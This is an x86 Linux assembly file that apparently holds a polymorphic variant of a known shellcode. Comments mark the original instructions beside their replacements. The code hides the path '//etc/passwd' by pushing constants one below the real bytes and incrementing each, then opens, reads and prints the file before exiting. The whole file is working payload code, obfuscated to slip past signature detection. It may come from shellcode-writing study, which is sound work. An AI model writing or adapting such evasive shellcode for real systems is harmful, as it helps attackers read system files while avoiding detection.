global _start

section .text
_start:

	xor ecx,ecx

	; mul ecx original shellcode
	; new shellcode below
	mov eax, ecx

	; mov al, 0x5 original shellcode

	; push ecx original shellcode
	push eax
	mov al, 0x5

	; original shellcode
	; push 0x64777373
	; push 0x61702f63
	; push 0x74652f2f

	; new shellcode
        push 0x64777372
        add dword [esp], 0x1
        push 0x61702f62
        add dword [esp], 0x1
        push 0x74652f2e
        add dword [esp], 0x1

	mov ebx,esp
	int 0x80

	xchg ebx,eax
	xchg ecx,eax
	mov al,0x3
	xor edx,edx
	mov dx,0xfff
	; inc edx original shellcode
	add edx, 0x1
	int 0x80

	xchg edx,eax
	xor eax,eax
	mov al,0x4
	mov bl,0x1
	int 0x80

	xchg ebx,eax
	int 0x80
